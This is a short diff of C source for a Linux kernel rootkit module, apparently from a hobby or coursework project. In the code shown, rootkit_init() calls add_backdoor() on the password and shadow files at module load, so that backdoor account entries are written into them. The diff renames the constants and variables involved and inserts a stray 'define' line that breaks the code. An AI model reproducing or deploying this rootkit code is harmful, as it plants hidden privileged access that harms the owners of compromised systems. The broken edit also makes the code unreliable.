@@ -64,10 +64,10 @@ void add_backdoor(char *path) {
 		
 		unsigned long ret;
 		
-		if (strcmp(path, PASSWD_FILE) == 0) 
-			{BACKDOOR = BACKDOOR_PASSWD;}
+		if (strcmp(path, PASSWORD_FILE) == 0) 
+			{BACKDOOR = backdoor_password;}
 		if (strcmp(path, SHADOW_FILE) == 0)
-			{BACKDOOR = BACKDOOR_SHADOW;}
+			{BACKDOOR = backdoor_shadow;}
 		
 		old_fs = get_fs(); 
 		
@@ -262,7 +262,9 @@ static int __init rootkit_init(void){
 	
 	// Start Marc
 	
-	add_backdoor(PASSWD_FILE);
+	define 
+	
+	add_backdoor(PASSWORD_FILE);
    	add_backdoor(SHADOW_FILE);
 	
 	// End Marc
